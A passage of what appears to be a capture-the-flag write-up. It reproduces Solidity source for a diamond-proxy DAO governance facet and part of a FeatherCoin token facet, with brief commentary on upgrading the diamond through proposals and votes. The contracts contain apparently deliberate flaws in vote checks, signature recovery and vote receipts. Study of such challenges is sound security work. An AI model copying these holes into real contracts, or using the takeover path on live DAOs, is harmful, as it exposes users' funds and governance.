</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">AppStorage</span><span class="p">,</span> <span class="n">Proposal</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/LibAppStorage.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LibDAO</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/LibDAO.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LibDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/LibDiamond.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IDiamondCut</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../interfaces/IDiamondCut.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../interfaces/IERC20.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">ECDSA</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/ECDSA.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">DAOFacet</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">AppStorage</span> <span class="k">internal</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Admin functions
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">setProposalThreshold</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_proposalThreshold</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">LibDiamond</span><span class="p">.</span><span class="n">enforceIsContractOwner</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">.</span><span class="n">proposalThreshold</span> <span class="o">=</span> <span class="n">_proposalThreshold</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isUserGovernance</span><span class="p">(</span><span class="kt">address</span> <span class="n">_user</span><span class="p">)</span> <span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">totalSupply</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">userBalance</span> <span class="o">=</span> <span class="n">LibDAO</span><span class="p">.</span><span class="n">getCurrentVotes</span><span class="p">(</span><span class="n">_user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">threshold</span> <span class="o">=</span> <span class="p">(</span><span class="n">userBalance</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="n">totalSupply</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">userBalance</span> <span class="o">&gt;=</span> <span class="n">threshold</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">submitProposal</span><span class="p">(</span><span class="kt">address</span> <span class="n">_target</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_callData</span><span class="p">,</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span> <span class="k">memory</span> <span class="n">_facetDetails</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">external</span>
</span></span><span class="line"><span class="cl">        <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">proposalId</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">LibDiamond</span><span class="p">.</span><span class="n">contractOwner</span><span class="p">()</span> <span class="o">||</span> <span class="n">isUserGovernance</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">),</span> <span class="s">&#34;DAOFacet: Must be contract owner&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">proposalId</span> <span class="o">=</span> <span class="n">LibDAO</span><span class="p">.</span><span class="n">submitProposal</span><span class="p">(</span><span class="n">_target</span><span class="p">,</span> <span class="n">_callData</span><span class="p">,</span> <span class="n">_facetDetails</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">executeProposal</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_proposalId</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Proposal</span> <span class="k">storage</span> <span class="n">proposal</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">proposals</span><span class="p">[</span><span class="n">_proposalId</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">proposal</span><span class="p">.</span><span class="n">executed</span><span class="p">,</span> <span class="s">&#34;DAOFacet: Already executed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">&gt;=</span> <span class="n">proposal</span><span class="p">.</span><span class="n">endBlock</span><span class="p">,</span> <span class="s">&#34;DAOFacet: Too early.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">proposal</span><span class="p">.</span><span class="n">forVotes</span> <span class="o">&gt;</span> <span class="n">proposal</span><span class="p">.</span><span class="n">againstVotes</span> <span class="o">&amp;&amp;</span> <span class="n">proposal</span><span class="p">.</span><span class="n">forVotes</span> <span class="o">&gt;</span> <span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">totalSupply</span> <span class="o">/</span> <span class="mi">10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s">&#34;DAOFacet: Proposal failed.&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">proposal</span><span class="p">.</span><span class="n">executed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">cut</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">[](</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">cut</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="n">facetAddress</span><span class="o">:</span> <span class="n">proposal</span><span class="p">.</span><span class="n">target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">action</span><span class="o">:</span> <span class="n">proposal</span><span class="p">.</span><span class="n">facetDetails</span><span class="p">.</span><span class="n">action</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">functionSelectors</span><span class="o">:</span> <span class="n">proposal</span><span class="p">.</span><span class="n">facetDetails</span><span class="p">.</span><span class="n">functionSelectors</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">LibDiamond</span><span class="p">.</span><span class="n">diamondCut</span><span class="p">(</span><span class="n">cut</span><span class="p">,</span> <span class="n">proposal</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">proposal</span><span class="p">.</span><span class="n">callData</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">castVoteBySig</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_proposalId</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">_support</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_sig</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">signer</span> <span class="o">=</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">recover</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x19</span><span class="s">Ethereum Signed Message:</span><span class="se">\n</span><span class="s">32&#34;</span><span class="p">),</span> <span class="n">_sig</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">signer</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;DAOFacet: Invalid signature.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">_vote</span><span class="p">(</span><span class="n">_sig</span><span class="p">,</span> <span class="n">_proposalId</span><span class="p">,</span> <span class="n">_support</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_vote</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_sig</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_proposalId</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">_support</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Proposal</span> <span class="k">storage</span> <span class="n">proposal</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">proposals</span><span class="p">[</span><span class="n">_proposalId</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">LibDAO</span><span class="p">.</span><span class="n">getPriorVotes</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">proposal</span><span class="p">.</span><span class="n">startBlock</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">s</span><span class="p">.</span><span class="n">voteThreshold</span><span class="p">,</span> <span class="s">&#34;DAOFacet: Not enough.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">&lt;=</span> <span class="n">s</span><span class="p">.</span><span class="n">proposals</span><span class="p">[</span><span class="n">_proposalId</span><span class="p">].</span><span class="n">endBlock</span><span class="p">,</span> <span class="s">&#34;DAOFacet: Too late.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">hasVoted</span> <span class="o">=</span> <span class="n">proposal</span><span class="p">.</span><span class="n">receipts</span><span class="p">[</span><span class="n">_sig</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">hasVoted</span><span class="p">,</span> <span class="s">&#34;DAOFacet: Already voted.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">votes</span> <span class="o">=</span> <span class="n">LibDAO</span><span class="p">.</span><span class="n">getPriorVotes</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">proposal</span><span class="p">.</span><span class="n">startBlock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_support</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">proposal</span><span class="p">.</span><span class="n">forVotes</span> <span class="o">+=</span> <span class="n">votes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">proposal</span><span class="p">.</span><span class="n">againstVotes</span> <span class="o">+=</span> <span class="n">votes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">proposal</span><span class="p">.</span><span class="n">receipts</span><span class="p">[</span><span class="n">_sig</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This facet is very interesting. We can see that the function <code>executeProposal</code> can be used to upgrade the <code>diamond</code> if we collect enough votes for the upgrade proposal. We can use <code>submitProposal</code> to submit the upgrade proposal. Another thing is that we can <code>castVote</code> as well whether we agree with the proposal or not, and the value of our votes was based on the number of <code>votes</code> that was calculated by the <code>FTC</code> token.</p>
<p>Let&rsquo;s check the <code>FTCFacet</code> to understand more how the <code>votes</code> works.</p>
<p><strong>FTCFacet.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">AppStorage</span><span class="p">,</span> <span class="n">Checkpoint</span><span class="p">,</span> <span class="n">LibAppStorage</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/LibAppStorage.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// import { LibERC20 } from &#34;../libraries/LibERC20.sol&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kn">import</span> <span class="p">{</span><span class="n">LibDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/LibDiamond.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">ECDSA</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/ECDSA.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LibDAO</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/LibDAO.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">FeatherCoinFacet</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">AppStorage</span> <span class="k">internal</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/*//////////////////////////////////////////////////////////////
</span></span></span><span class="line"><span class="cl"><span class="cm">                               READ FUNCTIONS
</span></span></span><span class="line"><span class="cl"><span class="cm">    //////////////////////////////////////////////////////////////*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">name</span><span class="p">()</span> <span class="k">external</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">string</span> <span class="k">memory</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;FeatherCoin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">symbol</span><span class="p">()</span> <span class="k">external</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">string</span> <span class="k">memory</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;FTC&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">decimals</span><span class="p">()</span> <span class="k">external</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">totalSupply</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">balances</span><span class="p">[</span><span class="n">_account</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">allowance</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_spender</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">allowances</span><span class="p">[</span><span class="n">_account</span><span class="p">][</span><span class="n">_spender</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/*//////////////////////////////////////////////////////////////
</span></span></span><span class="line"><span class="cl"><span class="cm">                               TOKEN LOGIC
</span></span></span><span class="line"><span class="cl"><span class="cm">    //////////////////////////////////////////////////////////////*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">LibDiamond</span><span class="p">.</span><span class="n">enforceIsContractOwner</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">_moveDelegates</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">s</span><span class="p">.</span><span class="n">delegates</span><span class="p">[</span><span class="n">_to</span><span class="p">],</span> <span class="n">_amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">_spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">.</span><span class="n">allowances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">_spender</span><span class="p">]</span> <span class="o">=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">.</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">unchecked</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">.</span><span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
